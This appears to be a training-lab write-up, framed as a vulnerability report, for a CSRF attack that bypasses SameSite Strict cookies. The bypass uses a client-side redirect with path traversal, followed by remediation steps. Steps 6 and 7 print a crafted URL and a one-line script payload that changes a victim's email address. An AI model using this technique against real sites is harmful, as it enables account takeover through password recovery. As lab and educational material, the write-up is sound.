# SameSite Strict bypass via client-side redirect

Summary:

We Like To Blog is vulnerable to a CSRF attack, bypassing their SameSite Strict restrictions through client side redirect. In simple terms, you can use the website to change the victim's email through a cross site request, bypassing the Strict SameSite.
I would rate this as a medium likelyhood, and a medium-high impact, as this allows an attacker to change a victim's email address, and could be used for password recovery, allowing access to the victim's personal account.

Attack:

1. Login to your test account, and go to a blog post.
2. Post a comment, notice the url and post ID.
3. Looking at the url, we can try to use a path traversal sequence to change the landing page after posting
4. using `/post/comment/confirmation?postId=7/../../my-account` we can test this, as it brings us back to our account
5. With this, we can force the victim to change the email address on the client side, ignoring the SameSite restrictions
6. using the parameters `/post/comment/confirmation?postId=7/../../my-account/change-email?email=hacked%40exploit.com%26submit=1`
7. Crafting a PoC, we can use a simple JS payload:
   ```
   <script>document.location = "https://0af4005904288fa7869aefff008000dc.web-security-academy.net/post/comment/confirmation?postId=7/../../my-account/change-email?email=hacked%40exploit.com%26submit=1";</script>
   ```
8. Viewing this code, instead of going to the expected landing page, the victim's email is changed client side, allowing a complete bypass of the SameSite restrictions.

Steps to resolution:
1. Implement a CSRF token
2. Ensure new token is session specific
3. Make sure session cookie and csrf token are different
